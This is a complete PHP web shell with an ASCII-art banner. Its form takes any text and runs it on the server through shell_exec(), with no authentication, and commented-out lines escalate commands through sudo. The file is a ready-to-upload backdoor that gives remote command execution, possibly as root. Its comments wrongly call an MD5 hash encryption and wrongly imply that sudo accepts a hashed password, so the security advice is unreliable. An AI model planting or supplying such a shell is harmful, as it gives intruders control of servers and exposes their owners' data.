
<?
##
## SHELL FOR EXECUTING COMMAND ONLINE WITH SUDO IN PHP
##
##
##███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗██████╗ ██╗   ██╗███████╗    
##████╗ ████║██╔═████╗██╔══██╗██╔══██╗██║  ██║╚════██╗██║   ██║██╔════╝    
##██╔████╔██║██║██╔██║██████╔╝██████╔╝███████║ █████╔╝██║   ██║███████╗    
##██║╚██╔╝██║████╔╝██║██╔══██╗██╔═══╝ ██╔══██║ ╚═══██╗██║   ██║╚════██║    
##██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║██████╔╝╚██████╔╝███████║    
##╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝                                                                            
##
## By M0rph3u5@Cup0fC0ff33
## for sudo user simple uncomment the $output and replace Encrypted_password_of_user
## Password should in encrypted 
## Use any online md5 converting utility.
?>
<HTML><BODY>
<FORM METHOD="POST" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="shell">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>

<?php
#enter md5 encryptd password if uploading to server for security and uncomment next line
 #$output = shell_exec("echo Encrypted_password_of_user| sudo -S" );
 
$opt=shell_exec($_POST['shell']);
  #Uncomment next line if executing sudo commands
  #echo $output;
  echo $opt;
  ?>



</pre>
</BODY></HTML>
